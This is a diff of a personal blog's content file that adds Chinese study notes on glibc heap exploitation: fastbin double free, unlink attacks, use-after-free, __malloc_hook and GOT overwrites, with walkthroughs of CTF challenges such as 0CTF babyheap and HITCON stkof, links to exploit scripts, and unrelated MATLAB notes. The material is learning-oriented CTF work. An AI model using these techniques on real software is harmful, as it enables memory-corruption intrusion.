+<pre><code>        IDX = (CHUNKSIZE - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT
+        On a 64 bit system the current values are:
+                MINSIZE: 0x20
+                MALLOC_ALIGNMENT: 0x10
+        So we get the following equation:
+        IDX = (CHUNKSIZE - 0x11) / 0x10</code></pre>
+<h4 id="chunksize计算公式：："><a href="#chunksize计算公式：：" class="headerlink" title="chunksize计算公式：："></a>chunksize计算公式：：</h4><pre><code>It is calculated as follows:
+        IF x + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE(0x20) CHUNKSIZE = MINSIZE (0x20)
+        ELSE: CHUNKSIZE = (x + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK) 
+        =&gt; CHUNKSIZE = (x + 0x8 + 0xf) &amp; ~0xf</code></pre>
+<p>64位下，将<code>最低四位置0</code>，因为size 总是16的倍数，要对齐</p>
+<p>当 req=24 时，request2size(24)=32。0x18+0x8+0xf &amp; ~0xf = 0x20而除去 chunk 头部的 16 个字节。实际上用户可用 chunk 的字节数为 16。而根据我们前面学到的知识可以知道 chunk 的 pre_size 仅当它的前一块处于释放状态时才起作用。所以用户这时候其实还可以使用下一个 chunk 的 prev_size 字段，正好 24 个字节</p>
+<h3 id="fastbin-dup-c"><a href="#fastbin-dup-c" class="headerlink" title="fastbin_dup.c"></a>fastbin_dup.c</h3><p>**double-free **<br><a href="https://guyinatuxedo.github.io/27-edit_free_chunk/double_free_explanation/index.html">https://guyinatuxedo.github.io/27-edit_free_chunk/double_free_explanation/index.html</a><br>同一地址释放两次，再分配时，可以得到同一地址的两个指针，释放一个指针，但可通过另外一个指针操作释放的这个相同块，放入一些数据</p>
+<p><a href="https://blog.csdn.net/chennbnbnb/article/details/109284780">https://blog.csdn.net/chennbnbnb/article/details/109284780</a><br>glibc2.31 版本下double free<br>tcache全称是Thead Cache</p>
+<p>首先要填充tcache bin，再分配释放后到 fastbin</p>
+<h3 id="fastbin-dup-into-stack-c-2-23"><a href="#fastbin-dup-into-stack-c-2-23" class="headerlink" title="fastbin_dup_into_stack.c 2.23"></a>fastbin_dup_into_stack.c 2.23</h3><p>在2.31下触发free(): double free detected in tcache 2</p>
+<p>fastbin 是单链，只有fd指针，指向下一个块<br>通过修改fd指针，指向一个伪造的fake chunk</p>
+<pre><code>gef➤  x/15gx 0x602010-0x10
+0x602000:   0x0000000000000000  0x0000000000000021 &lt;-- chunk a [be freed twice]
+0x602010:   0x0000000000602020  0x0000000000000000      &lt;-- fd pointer
+0x602020:   0x0000000000000000  0x0000000000000021 &lt;-- chunk b [be freed]
+0x602030:   0x0000000000602000  0x0000000000000000      &lt;-- fd pointer
+0x602040:   0x0000000000000000  0x0000000000000021 &lt;-- chunk c
+0x602050:   0x4343434343434343  0x0000000000000000
+0x602060:   0x0000000000000000  0x0000000000020fa1
+0x602070:   0x0000000000000000</code></pre>
+<hr>
+<pre><code>unsigned long long *d = malloc(8);
+stack_var = 0x20;
+*d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));</code></pre>
+<p>fastbin 的fd指针指向下一个空闲块的<code> metadata开始的地址处</code><br>malloc 返回的地址指向的是<code>user data开始处</code>，d是double free后的重复块地址，所以上面的赋值是 将<code>fake_chunk的metadata起始地址 赋给 块中的fd指针</code>，因为这是 d 是double free，虽然分配了，但<code>也指向空闲块中</code>，将chUnk fd 指针指向一个 fake chunk 的metadata起始地址处，即prev_size ; size=20; userdata。</p>
+<pre><code>Fastbins[idx=0, size=0x20]  ←  Chunk(addr=0x55555555a010, size=0x20, flags=PREV_INUSE)  ←  Chunk(addr=0x7fffffffdd50, size=0x20, flags=)  ←  Chunk(addr=0x55555555a020, size=0x0, flags=) [incorrect fastbin_index] </code></pre>
+<p>可以看到成功</p>
+<p>typedef struct var newtype;<br>struct var 的别名为newtype、</p>
+<h3 id="heap-consolidation"><a href="#heap-consolidation" class="headerlink" title="heap_consolidation"></a>heap_consolidation</h3><p>Editing freed chunks will allow us to overwrite heap metadata, which is crucial to a lot of attacks.<br>edit a freed chunk using a heap overflow bug to cause consolidation</p>
+<p>overwrite the size to be 0x510, essentially clearing the previous in use bit. This way when we free this chunk, it will think that the previous chunk has been freed</p>
+<p>这样就再分配后，就有两个指针指向同一个块</p>
+<p>改写当前size中 is_prev位，使得释放当前块后，认为<code>前一个块是free的</code><br>heap_overflow </p>
+<pre><code>ptr2 = malloc(0x500);
+ptr2[-1] 指示size
+ptr[-2] 指示prev_size</code></pre>
+<p><code>fastbin_dup_consolidate.c 2.23</code><br><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#fastbin_dup_consolidate">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#fastbin_dup_consolidate</a><br>利用在 large bin 的分配中 malloc_consolidate 机制绕过 fastbin 对 double free 的检查</p>
+<p>malloc(0x400) small bins（回收最大值）后，<code>fastbin 中的跑到 small bins中</code><br>[+] small_bins[4]: fw=0x55555555b000, bk=0x55555555b000<br> →   Chunk(addr=0x55555555b010, size=0x50, flags=PREV_INUSE)</p>
+<p>2.23 里malloc_consolidate，先回收 fastbins 里的到unsorted bin中，因为这个bin满足不了分配要来，按照大小 又到了small bins中，也有可能到达large bins中。</p>
+<p><code>此时可以再free() 一次，因为该块不在fastbin，释放后归到fastbins中。</code></p>
+<p>这样我们就相当于double free</p>
+<h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><p>一般称被释放后没有被设置为 NULL 的内存指针为<code> dangling pointer</code></p>
+<p>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么程序很有可能可以正常运转。<br>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，就很有可能会出现奇怪的问题。</p>
+<p>释放块后，指向其的指针不清除，所以可以再用这个指针写入数据</p>
+<h2 id="babyheap-2017"><a href="#babyheap-2017" class="headerlink" title="babyheap 2017"></a>babyheap 2017</h2><p>有点莽，说实话不是很懂<br><a href="https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2017-0ctf-babyheap">https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2017-0ctf-babyheap</a><br><a href="https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html">https://guyinatuxedo.github.io/28-fastbin_attack/0ctf_babyheap/index.html</a><br><a href="https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html">https://uaf.io/exploitation/2017/03/19/0ctf-Quals-2017-BabyHeap2017.html</a></p>
+<p>GNU/Linux 2.6.32 对应着glibc 2.23版本</p>
+<pre><code>┌─[zentreisender@parrotos]─[~/Documents/heap/题目]
+└──╼ $file /glibc/2.23/lib/libc-2.23.so 
+/glibc/2.23/lib/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /glibc/2.23/lib/ld-linux-x86-64.so.2, BuildID[sha1]=eb6c32093c3e8e3b1c03a382947ec4151d036d75, for GNU/Linux 2.6.32, with debug_info, not stripped</code></pre>
+<hr>
+<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>The first will involve <code>causing heap consolidation to get a libc infoleak</code>. The second will involve using <code>a Fastbin Attack to write a oneshot gadget to the hooc of malloc</code>. The libc infoleak will allow us to break ASLR in libc and know the address of everything, and writing over the malloc hook with a ROP gadget (that will call system) will <code>give us a shell</code> when we call malloc (we need the infoleak to figure out where the malloc hook and rop gadget are)<br>也可以使用chunck overlap泄露unsorted bin的地址</p>
+<hr>
+<p>题目不是原本的相同实现方法，但思想是不变的<br>开启了<code>relrc</code>,不能修改got；alloc pointers in a <code>random mmap area</code>. Therefore, we do not know the address to launch the <code>“unsafe unlink” attack</code></p>
+<hr>
+<h3 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h3><p><code>v6 = __readfsqword(0x28u);</code><br>Read memory from a location specified by an offset relative to the beginning of the GS segment.<br><a href="https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-160">https://docs.microsoft.com/en-us/cpp/intrinsics/readgsbyte-readgsdword-readgsqword-readgsword?view=msvc-160</a></p>
+<pre><code>void* calloc (size_t num, size_t size);
+Allocate and zero-initialize array
+Size of each element.
+pData = (int*) calloc (i,sizeof(int));</code></pre>
+<p>fill 中size由自己定义，存在漏洞, the vulnerability is evident. We can fill the arbitrary length of input to the heap and overflow anything after that.</p>
+<p><code>$readelf -s /glibc/2.23/lib/libc-2.23.so | grep __malloc_hook</code></p>
+<p>我们想要做的是 泄露libc的基址，Heap overlap.<br>Overlapping two chunks to leak the address of the libc</p>
+<p>将 chunk 4 释放掉，其 fd 指针会被设置为指向 unsorted bin 链表的头部，这个地址在 libc 中，且相对位置固定，利用它就可以算出 libc 被加载的地址<br>这时新的chunk2也指向fd , bk</p>
+<p>调用 malloc() 时，首先判断 hook 函数指针是否为空，不为空则调用它。所以这里我们传入一个 one-gadget。<br><a href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p>
+<p><code>gef➤  x/10gx (long long)(&amp;main_arena)-0x30</code></p>
+]]></content>
+      <categories>
+        <category>heap</category>
+      </categories>
+      <tags>
+        <tag>heap</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>heap入门2</title>
+    <url>/2021/03/20/heap%E5%85%A5%E9%97%A82/</url>
+    <content><![CDATA[<h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p><code>objdump -M intel -D ./heap0 | grep winner</code><br><code>gef➤  help search-pattern </code></p>
+<h2 id="nightmare"><a href="#nightmare" class="headerlink" title="nightmare"></a>nightmare</h2><h2 id="protostar-heap0"><a href="#protostar-heap0" class="headerlink" title="protostar:heap0"></a>protostar:heap0</h2><p><code>objdump -D heap0 | grep winner</code></p>
+<pre><code>┌─[zentreisender@parrotos]─[~/Documents/nightmare/modules/24-heap_overflow/protostar_heap0]
+└──╼ $objdump -M intel -D ./heap0 | grep winner
+080484b6 &lt;winner&gt;:
+080484e1 &lt;nowinner&gt;:</code></pre>
+<p>简单的堆溢出，复制时没有检查大小</p>
+<a id="more"></a>
+<h2 id="protostar-heap1"><a href="#protostar-heap1" class="headerlink" title="protostar:heap1"></a>protostar:heap1</h2><p>strcpy 没有检查大小<br>第一次strcpy进行溢出，覆盖地址为got表中put地址，第二次向puts地址写入winner()函数地址，接下来调用puts()的时候，实际上调用到winner()</p>
+<pre><code>gef➤  help search-pattern 
+SearchPatternCommand: search a pattern in memory. If given an hex value (starting with 0x)</code></pre>
+<p>可以用来搜索内存中值，打印位置</p>
+<h2 id="protostar-heap2"><a href="#protostar-heap2" class="headerlink" title="protostar:heap2"></a>protostar:heap2</h2><p>%p 打印地址</p>
+<pre><code>    00100ab3 48 8d 85        LEA        RAX=&gt;local_98,[RBP + -0x90]
+             70 ff ff ff
+    00100aba 48 83 c0 07     ADD        RAX,0x7</code></pre>
+<p>The strdup() function returns a pointer to a new string which is a duplicate of the string s.  Memory for the new string is obtained with malloc(3), and can be freed with free(3).</p>
+<p>复制时 没有大小检查，且是分配在堆上</p>
+<h2 id="Unlink-explannation"><a href="#Unlink-explannation" class="headerlink" title="Unlink() explannation"></a>Unlink() explannation</h2><p><a href="https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344">https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344</a><br>malloc 代码 里有unlink</p>
+<h3 id="什么是unlink攻击"><a href="#什么是unlink攻击" class="headerlink" title="什么是unlink攻击"></a>什么是unlink攻击</h3><p>The most common scenario is a vulnerable <code>buffer that can be overflow </code>and has <code>a global pointer</code>. 要是全局变量  </p>
+<ol>
+<li>要有溢出漏洞</li>
+<li>chunk地址存在一指针数组中，且是全局变量</li>
+</ol>
+<p><code>unlink()</code> 是将双向链表的 块拿出来， 就需要重新调整 fd 和 bk 指针<br>例如 free 时和目前物理相邻的 free chunk 进行合并<br>It handles the process of overwriting pointers from the next and previous chunks to the other, to fill in the gap from taking out the chunk in the middle.</p>
+<h3 id="第一个检查：："><a href="#第一个检查：：" class="headerlink" title="第一个检查：："></a>第一个检查：：</h3><p>The first check we need to worry about, is it checks if the Fd and Bk pointers of our fake heap chunk (they point to the next and previous chunks) point to chunks that have <code>pointers back</code> to our fake chunk.</p>
+<hr>
+<p>构建一个fake chunk，这个chunk 可以在已申请的chunk中构建，因为我们可以写入值。<br><code>temp = (uint64_t *)ptr0[2]; </code> 将fd的值指针化后赋给 temp<br><code>printf(&quot;Fd-&gt;bk:    \t\t%p\n&quot;, (void *)temp[3]); </code><br>%p 按十六进制输出数据 </p>
+<h3 id="void-为”无类型指针”"><a href="#void-为”无类型指针”" class="headerlink" title="void * 为”无类型指针”"></a>void * 为”无类型指针”</h3><p>内存分配函数 malloc 函数返回的指针就是 void * 型，用户在使用这个指针的时候，要进行强制类型转换，也就是显式说明该指针指向的内存中是存放的什么类型的数据 (int <em>)malloc(1024) 表示强制规定 malloc 返回的 void</em> 指针指向的内存中存放的是一个个的 int 型数据。</p>
+<hr>
+<h3 id="fake-chunk-fd-bk"><a href="#fake-chunk-fd-bk" class="headerlink" title="fake_chunk fd bk"></a>fake_chunk fd bk</h3><p>fd 在<code>0x10</code> 偏移处，bk 在<code>0x18</code>偏移处<br>fake= ptr0<br>target=ptr0<br><code>fake-&gt;fd = target-0x18 =FD </code>减0x18是因为下面是<code>取 bk </code><br>因为 FD-&gt; bk = fake FD的其他结构值都不重要，只要bk值，这里就是&amp;target，这个地址保存着fake chunk metadata的开始地址，即ptr0<br><code>target-0x18+0x18 = fake chunk = ptr0</code></p>
+<p>同理</p>
+<pre><code>fake-&gt;bk=target-0x10 =BK
+BK-&gt;fd = fake = ptr0
+target-0x10 + 0x10 =ptr0</code></pre>
+<p>we will edit the <code>heap metadata of the second chunk</code>, so that it will say that the previous chunk has been freed and it points to our fake chunk.<br>只要设置<code>prev_size</code>，到metadata开始处，就认为是其前一个块</p>
+<p>Then when we free the second chunk, it will cause our fake chunk to <code>be unlinked</code> and execute the <code>pointer write</code>.<br>will check that the size of our chunk is equal to the previous size of the chunk being freed<br><strong>利用堆溢出 来修改</strong></p>
+<hr>
+<p>The final check we have to worry about is for fd_nextsize. Essentially it just checks to see if it is equal to 0x0, and if it is it skips a bunch of checks.<br>现在不为0才跳过一些检查</p>
+<h3 id="chunk结构"><a href="#chunk结构" class="headerlink" title="chunk结构"></a>chunk结构</h3><pre><code>struct malloc_chunk &#123;
+  INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
+  INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
+  struct malloc_chunk* fd;         /* double links -- used only if free. */
+  struct malloc_chunk* bk;
+  /* Only used for large blocks: pointer to next larger size.  */
+  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
+  struct malloc_chunk* bk_nextsize;
+&#125;;</code></pre>
+<p>双向链表结构的bin中，fd_nextsize 指向下一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。<br>bk_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。<br>就是 bk 接下来的8字节，</p>
+<h3 id="unlink-写操作"><a href="#unlink-写操作" class="headerlink" title="unlink 写操作"></a>unlink 写操作</h3><p>unlink操作如下：：</p>
+<pre><code>FD = fake-&gt;fd;
+BK = fake-&gt;bk;
+FD-&gt;bk = BK
+BK-&gt;fd = FD</code></pre>
+<p>那么最后，<code>BK-&gt;fd = FD</code><br>Fd pointer: 0x55d9452cf038<br>Bk  pointer: 0x55d9452cf040<br>Bk-&gt;Fd:            0x55d946d5d420  即target地址存储的值<br>*target=fd=0x55d9452cf038</p>
+<p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#unsafe_unlink">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/3.1.6_heap_exploit_1.html#unsafe_unlink</a><br>这时 chunk0_ptr 和 chunk0_ptr[3] 实际上就是同一东西。这里可能会有疑惑为什么这两个东西是一样的，因为 chunk0_ptr 指针在是放在数据段上的，<strong>地址在 0x601070</strong>，<strong>指向 0x601058</strong>，而 chunk0_ptr[3] 的意思是从 chunk0_ptr <strong>指向的地方</strong>开始数 3 个单位，所以 *<em>0x601058+0x08</em>3=0x601070**</p>
+<p>所以给chunk0[3] 赋值 就相当于给chunk赋值，最后chunk[0] 为改写地址处的内容<br>chunk0是指针（重要）<br>&amp;chunk0[3]==&amp;chunk0</p>
+<h2 id="nightmare-HITCON’14-stkof"><a href="#nightmare-HITCON’14-stkof" class="headerlink" title="nightmare HITCON’14: stkof"></a>nightmare HITCON’14: stkof</h2><p><code>00602100</code><br>Our exploitation process will contain two parts. The first will be<code> doing an Unlink Attack</code>, and the second will be a <code>GOT overwrite / infoleak</code>.</p>
+<h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><p>Unlinking for the heap is the process of removing a chunk from a bin list (in this case for heap consolidation for performance improvement reasons).</p>
+<p>What this attack will do is <code>give us a write</code>.<br>However there are a lot of restrictions on what we can write and where we can write.<br>Essentially when an unlink happens, it will write pointers to a chunk to fill in the gap of the chunk that was taken out.<br>这就是写的来源<br>因为最后<code>BK-&gt;fd=FD</code></p>
+<p>本题中指针ptr，所在是一个指针数组，数组中的内容是指针，指向其他地方<br>首先我们要有一个指向 一个chunk块的指针ptr，来使得bk-&gt;fd 和 fd-&gt;bk指向fake chunk<br>题目中malloc后地址</p>
+<pre><code>                /* 将块地址保存在这里 */
+*(void **)(&amp;DAT_00602140 + (long)(int)DAT_00602100 * 8) = pvVar1;
+
+
+    004009a8 48 98           CDQE
+    004009aa 48 8b 55 88     MOV        RDX,qword ptr [RBP + local_80]
+                         将块地址保存在这里
+    004009ae 48 89 14        MOV        qword ptr [DAT_00602140 + RAX*0x8],RDX
+             c5 40 21 
+             60 00</code></pre>
+<p>动态运行下就知道地址</p>
+<pre><code> →   0x4009ae                  mov    QWORD PTR [rax*8+0x602140], rdx
+此时$rax   : 0x1               
+所以保存在地址0x602148</code></pre>
+<p>接着来设置 fake chunk 的fd , bk指针</p>
+<p>所以先分配两个块，这两个块不一定要相邻在一起，相邻可以简单地使用堆溢出，也好融合，然后在第一个块中创建fake chunk， 在free第二个块后，触发Unlink </p>
+<pre><code>那么fake chunk fd=ptr-0x18   , fd-&gt;bk=ptr
+fake chunk bk=ptr-0x10 , bk -&gt;fd=ptr</code></pre>
+<p>然后是设置size, pre_size和size要相符，然后是fd_nextsize == null （在glibc2.23下）</p>
+<p>unlink 后<br><code>*ptr=ptr-0x8*3</code><br>可以用来got覆写</p>
+<h3 id="GOT-Overwrite-Infoleak"><a href="#GOT-Overwrite-Infoleak" class="headerlink" title="GOT Overwrite / Infoleak"></a>GOT Overwrite / Infoleak</h3><p>现在有了一个指向指针数组的指针<br>就可以 向数组中写入指针</p>
+<hr>
+<p><a href="https://github.com/Finsenty54/attack-code/blob/master/heap/Hitcon_2014_stkof/myexploit.py">https://github.com/Finsenty54/attack-code/blob/master/heap/Hitcon_2014_stkof/myexploit.py</a><br>代码以及注解</p>
+<h2 id="zctf-2016-note2"><a href="#zctf-2016-note2" class="headerlink" title="zctf 2016 note2"></a>zctf 2016 note2</h2><p>把名字放在这里006020e0<br>最多四个块</p>
+<hr>
+<p><code>DAT_00602120</code>分配的块的地址放在这里，8字节，顺序排列<br>相应块的输入值大小放在DAT_00602140</p>
+<p>这些位置在<code>bss</code>中，全局未初始化变量</p>
+<pre><code>Chunk(addr=0x108c2a0, size=0x90, flags=PREV_INUSE)
+    [0x000000000108c2a0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
+Chunk(addr=0x108c330, size=0x90, flags=PREV_INUSE)
+    [0x000000000108c330     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
+Chunk(addr=0x108c3c0, size=0x90, flags=PREV_INUSE)
+    [0x000000000108c3c0     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
+Chunk(addr=0x108c450, size=0x90, flags=PREV_INUSE)
+    [0x000000000108c450     00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................]
+Chunk(addr=0x108c4e0, size=0x20b30, flags=PREV_INUSE)  ←  top chunk
+gef➤  x/32gx 0x00602120
+0x602120:    0x000000000108c2a0    0x000000000108c330
+0x602130:    0x000000000108c3c0    0x000000000108c450</code></pre>
+<p>自带的libc-2.19.so 太老了，使用2.23</p>
+<p>overwrite_append() 函数里有数组长度检查，没有堆溢出<br>教程这里，将输入的长度设为0x00，造成整数溢出？？因为确实0x00-1=0xffffffff，同时设置成0x00，还是会分配0x20的空间</p>
+<p>The first will hold our fake chunk for the unlink. The second chunk we will use to <code>overflow the metadata of the third chunk</code>. The third chunk will be the one which we overwrite the <code>heap metadata to point to the fake chunk,</code> and we free it.<br>只用修改prev_size</p>
+<hr>
+<pre><code>0x23ce320:    0x0000000000000000    0x0000000000000021
+0x23ce330:    0x3535353535353535    0x3535353535353535
+0x23ce340:    0x00000000000000a0    0x0000000000000090
+0x23ce350:    0x3131313131313100    0x3131313131313131</code></pre>
+<p>溢出</p>
+<p><a href="https://github.com/Finsenty54/attack-code/blob/master/heap/zctf_2016_note2/exploit.py">https://github.com/Finsenty54/attack-code/blob/master/heap/zctf_2016_note2/exploit.py</a><br>攻击代码<br><strong>泄露got表中内容，即实际地址值</strong></p>
+]]></content>
+      <categories>
+        <category>heap</category>
+      </categories>
+      <tags>
+        <tag>heap</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>leetcode 1 two sum</title>
     <url>/2020/11/26/leetcode-1-two-sum/</url>
     <content><![CDATA[<p>leetcode 1 two sum</p>
@@ -2185,6 +2440,49 @@ dicomwrite(Imodified,&#39;ankle_newseries.dcm&#39;,info);</code></pre>
       </tags>
   </entry>
   <entry>
+    <title>matlab笔记1</title>
+    <url>/2020/01/30/matlab%E7%AC%94%E8%AE%B01/</url>
+    <content><![CDATA[<p><code>a = [1 2 3 4]</code><br>创建矩阵的另一种方法是使用 ones、zeros 或 rand 等函数。例如，创建一个由零组成的 5×1 列向量。<br><code>z = zeros(5,1)</code></p>
+<hr>
+<p>MATLAB 允许您使用单一的算术运算符或函数来处理矩阵中的所有值。<br><code>a + 10</code></p>
+<hr>
+<a id="more"></a>
+
+<p>要转置矩阵，请使用单引号 (‘)</p>
+<hr>
+<p>format 命令可以显示更多小数位数：</p>
+<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">format long</span><br><span class="line">p = a<span class="emphasis">*inv(a)</span></span><br><span class="line"><span class="emphasis">format short</span></span><br></pre></td></tr></table></figure>
+<p>format 仅影响数字显示，而不影响 MATLAB 对数字的计算或保存方式。</p>
+<hr>
+<p>要执行元素级乘法（而非矩阵乘法），请使用 .* 运算符：<br><code>p = a.*a</code><br>乘法、除法和幂的矩阵运算符分别具有执行元素级运算的对应数组运算符。例如，计算 a 的各个元素的三次方：<br><code>a.^3</code></p>
+<hr>
+<p>串联是连接数组以便形成更大数组的过程。实际上，第一个数组是通过将其各个元素串联起来而构成的。成对的方括号 [] 即为串联运算符。<br><code>A = [a,a]</code></p>
+<hr>
+<p>使用逗号将彼此相邻的数组串联起来称为水平串联。每个数组必须具有相同的行数。同样，如果各数组具有相同的列数，则可以使用分号垂直串联。<br><code>A = [a; a]</code></p>
+<hr>
+<p>要表示复数的虚部，请使用 i 或 j。</p>
+<pre><code>c = [3+4i, 4+3j; -i, 10j]
+c = 2×2 complex</code></pre>
+<hr>
+<p><code>clc</code></p>
+<hr>
+<blockquote>
+<p>每个变量都是一个可包含许多数字的数组</p>
+</blockquote>
+<hr>
+<p>引用数组中的特定元素有两种方法。最常见的方法是指定行和列下标，例如<br><code>A(4,2)</code><br>另一种方法不太常用，但有时非常有用，即使用单一下标按顺序向下遍历每一列：<br><code>A(8)</code><br>可以在赋值语句左侧指定当前维外部的元素。数组大小会增大以便容纳新元素。<br><code>A(4,5) = 17</code></p>
+<hr>
+<p>要引用多个数组元素，请使用冒号运算符，这使您可以指定一个格式为<code>start:end</code>的范围。例如，列出 A 前三行及第二列中的元素：<br><code>A(1:3,2)</code><br>单独的冒号（没有起始值或结束值）指定该维中的所有元素。例如，选择 A 第三行中的所有列：<br><code>A(3,:)</code></p>
+<hr>
+<p>冒号运算符还允许您使用较通用的格式<code>start: step :end</code>创建等距向量值。如果省略中间的步骤（如 <code>start:end</code> 中），MATLAB 会使用默认步长值 1。<br><code>B = 0:10:100</code></p>
+<hr>
+<p>退出 MATLAB 后，工作区变量不会保留。使用<code>save</code>命令保存数据以供将来使用，<br><code>save myfile.mat</code><br>要清除工作区中的所有变量，请使用<code>clear</code>命令。<br>使用 load 将 MAT 文件中的数据还原到工作区。<br><code>load myfile.mat</code></p>
+]]></content>
+      <tags>
+        <tag>matlab</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>matlab笔记2</title>
     <url>/2020/02/01/matlab%E7%AC%94%E8%AE%B02/</url>
     <content><![CDATA[<p>处理文本时，将字符序列括在单引号中。可以将文本赋给变量。<br><code>myText = &#39;Hello, world&#39;;</code><br>如果文本包含单引号，使用两个单引号。</p>
@@ -2264,49 +2562,6 @@ end</code></pre>
 <hr>
 <p>MATLAB 不需要任何类型声明或维度说明。当 MATLAB 遇到新的变量名称时，它会自动创建变量，并分配适当大小的存储。如果此变量已存在，MATLAB 会更改其内容，并根据需要分配新存储。</p>
 <p>MATLAB 仅使用名称的前 N 个字符（其中 N 是函数 namelengthmax 返回的数字） 为63</p>
-]]></content>
-      <tags>
-        <tag>matlab</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>matlab笔记1</title>
-    <url>/2020/01/30/matlab%E7%AC%94%E8%AE%B01/</url>
-    <content><![CDATA[<p><code>a = [1 2 3 4]</code><br>创建矩阵的另一种方法是使用 ones、zeros 或 rand 等函数。例如，创建一个由零组成的 5×1 列向量。<br><code>z = zeros(5,1)</code></p>
-<hr>
-<p>MATLAB 允许您使用单一的算术运算符或函数来处理矩阵中的所有值。<br><code>a + 10</code></p>
-<hr>
-<a id="more"></a>
-
-<p>要转置矩阵，请使用单引号 (‘)</p>
-<hr>
-<p>format 命令可以显示更多小数位数：</p>
-<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">format long</span><br><span class="line">p = a<span class="emphasis">*inv(a)</span></span><br><span class="line"><span class="emphasis">format short</span></span><br></pre></td></tr></table></figure>
-<p>format 仅影响数字显示，而不影响 MATLAB 对数字的计算或保存方式。</p>
-<hr>
-<p>要执行元素级乘法（而非矩阵乘法），请使用 .* 运算符：<br><code>p = a.*a</code><br>乘法、除法和幂的矩阵运算符分别具有执行元素级运算的对应数组运算符。例如，计算 a 的各个元素的三次方：<br><code>a.^3</code></p>
-<hr>
-<p>串联是连接数组以便形成更大数组的过程。实际上，第一个数组是通过将其各个元素串联起来而构成的。成对的方括号 [] 即为串联运算符。<br><code>A = [a,a]</code></p>
-<hr>
-<p>使用逗号将彼此相邻的数组串联起来称为水平串联。每个数组必须具有相同的行数。同样，如果各数组具有相同的列数，则可以使用分号垂直串联。<br><code>A = [a; a]</code></p>
-<hr>
-<p>要表示复数的虚部，请使用 i 或 j。</p>
-<pre><code>c = [3+4i, 4+3j; -i, 10j]
-c = 2×2 complex</code></pre>
-<hr>
-<p><code>clc</code></p>
-<hr>
-<blockquote>
-<p>每个变量都是一个可包含许多数字的数组</p>
-</blockquote>
-<hr>
-<p>引用数组中的特定元素有两种方法。最常见的方法是指定行和列下标，例如<br><code>A(4,2)</code><br>另一种方法不太常用，但有时非常有用，即使用单一下标按顺序向下遍历每一列：<br><code>A(8)</code><br>可以在赋值语句左侧指定当前维外部的元素。数组大小会增大以便容纳新元素。<br><code>A(4,5) = 17</code></p>
-<hr>
-<p>要引用多个数组元素，请使用冒号运算符，这使您可以指定一个格式为<code>start:end</code>的范围。例如，列出 A 前三行及第二列中的元素：<br><code>A(1:3,2)</code><br>单独的冒号（没有起始值或结束值）指定该维中的所有元素。例如，选择 A 第三行中的所有列：<br><code>A(3,:)</code></p>
-<hr>
-<p>冒号运算符还允许您使用较通用的格式<code>start: step :end</code>创建等距向量值。如果省略中间的步骤（如 <code>start:end</code> 中），MATLAB 会使用默认步长值 1。<br><code>B = 0:10:100</code></p>
-<hr>
-<p>退出 MATLAB 后，工作区变量不会保留。使用<code>save</code>命令保存数据以供将来使用，<br><code>save myfile.mat</code><br>要清除工作区中的所有变量，请使用<code>clear</code>命令。<br>使用 load 将 MAT 文件中的数据还原到工作区。<br><code>load myfile.mat</code></p>
 ]]></content>
       <tags>
         <tag>matlab</tag>
@@ -2620,6 +2875,119 @@ Usage: xargs [OPTION]... COMMAND [INITIAL-ARGS]...</code></pre>
 ]]></content>
       <tags>
         <tag>RCE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwnable.kr (1)</title>
+    <url>/2021/03/06/pwnable.kr_1/</url>
